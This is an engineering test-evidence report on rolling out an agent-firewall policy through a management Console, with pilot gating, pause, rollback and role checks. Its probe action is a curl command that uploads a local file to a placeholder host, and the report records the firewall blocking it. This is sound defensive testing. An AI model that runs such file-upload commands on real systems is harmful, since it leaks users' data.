# Console managed Agent rollout: browser-to-Agent evidence (2026-10-29)

Guide: [CONSOLE_AGENT_ROLLOUT.md](../CONSOLE_AGENT_ROLLOUT.md). Raw sanitized
report and screenshots: [console-agent-rollout-2026-10-29/](console-agent-rollout-2026-10-29/report.json).

## Environment and scope

| Item | Value |
| --- | --- |
| Platform | hosted Ubuntu 24.04.5 x86_64 container (not a physical host, not WSL2) |
| Base | main `d57a8696` |
| Source | code commit of this change, tree `ac3e8f093ea21dd74a3d4da7dad799b276ca591b` (local commit `cf196f65`), clean |
| Console `llm-firewall` | `792ce4ee7f4ac5071190784adf23a9d17912dd03a5f619ebb5244de7305490c6` (debug, local Rust 1.97.0, not the pinned 1.99.1) |
| Agent `agentfw` | `88e18df9954d2bace4837fb020b4603efe4be197c68bac3ecafc43b1c05acdaf` (same build) |
| Store | disposable SQLite Console on 127.0.0.1 |
| Agent transport | existing SOU-43 HTTPS client through an owned private-CA edge on 127.0.0.1 (`SOUP_MANAGED_AGENT_TLS_CA_FILE`); CA SHA-256 `92:A4:EC:...:1D:73`; edge to Console is loopback HTTP |
| Browser | Chromium (Playwright) to the Console over loopback HTTP |
| Cohort | one pilot and two worker `agentfw serve` daemons, enforce mode |
| Policies | baseline `default: allow` (`8aa28ebc...`); candidate denies network-class actions, allows the rest (`8ec4f363...`) |

Synthetic tenant, Agents and policies only. No provider call, customer
infrastructure, paid inference or public deployment. This is one disposable
private deployment, not production, multi-host or remote attestation evidence.

## Result: `scripts/console-rollout-acceptance.py` passed, 38 checks

Every group, membership, revision, approval, deployment, gate evaluation,
pause, resume and rollback was performed by clicking the Console panel as an
Owner. Each Agent's decision was observed independently through its own
authenticated PreToolUse hook, before any tool runs: a network send
(`curl -d @notes.txt https://upload.example.invalid/...`) and a useful local
`Read` of `notes.txt`.

| Step | Observed |
| --- | --- |
| Baseline to all three | revision created with matching browser and server SHA-256, typed approval, typed pilot start with frozen cohort equal to the preview; gate opened on real applied ACKs; all three at sequence 1; send and read allowed on all three |
| Candidate with the pilot offline | only the pilot was issued; **Evaluate pilot gate** left the plan in `pilot`; both workers `not_issued`, still on baseline sequence 1, send still allowed |
| Ambiguous pause | the POST reached the server but the browser saw a network failure; the panel reported an unknown outcome, re-read the persisted plan (`paused`) and sent exactly one POST (no retry) |
| Console restart | the paused plan kept its rollout ID, frozen pilots/workers and deployment map |
| Viewer / Operator | Viewer page showed the plan with no visible change control and no browser storage; 20 Viewer/Operator API mutations (create group, members, revision, approve, start, advance, pause, resume, rollback) all returned 403; an Agent credential got 401; plan, members and revisions unchanged |
| Resume, pilot back | the pilot's exact ACK opened the gate; workers were issued and applied; plan `completed` at sequence 2; **send denied and read allowed on all three** |
| Rollback | confirmation listed each frozen baseline and stayed disabled for an inexact phrase; typed `rollback candidate`; new deployments at sequence 3; plan `rolled_back`; send allowed again and read allowed on all three |
| Hygiene | no token in browser storage or URL; Agents fetched over the HTTPS edge (29 forwarded requests); report contains no tokens, seeds, policy YAML, signatures or temporary paths |

Screenshots: [gate closed with offline pilot](console-agent-rollout-2026-10-29/offline-pilot-gate-closed.png),
[ambiguous pause reconciled](console-agent-rollout-2026-10-29/ambiguous-pause-reconciled.png),
[candidate completed](console-agent-rollout-2026-10-29/candidate-completed.png),
[rollback confirmation](console-agent-rollout-2026-10-29/rollback-confirmation.png),
[rolled back](console-agent-rollout-2026-10-29/rolled-back.png),
[Viewer read-only](console-agent-rollout-2026-10-29/viewer-read-only.png).

## Focused regressions

- `scripts/tests/test_console_rollout_browser.py` (11, bounded API fixtures):
  Viewer and Operator see no change control; exact identity and distinct
  recorded states; typed confirmation is exact; double submission sends one
  request; an ambiguous result keeps changes disabled until a successful
  reconcile and never re-sends; a concurrent plan change sends nothing; 401
  and 403 make the panel read-only; a frozen cohort that differs from the
  preview is reported; a server digest mismatch says "Do not approve it"; a
  late response after a tenant switch is discarded; empty and error states.
- `crates/proxy/tests/proxy_tenants.rs`: the served page includes the panel,
  has no unreplaced placeholders and no browser storage.
- Existing backend controls reused unchanged, including
  `managed_group_rollout::test_group_mutations_require_owner_and_agent_credentials_cannot_authorize_them`
  (passed locally).

## Not claimed

Rejection by an untrusted signer was not exercised through the browser (the
panel does not select signing keys; the backend witness covers it). No
PostgreSQL run, exact-pin toolchain, multi-host TLS or production readiness.
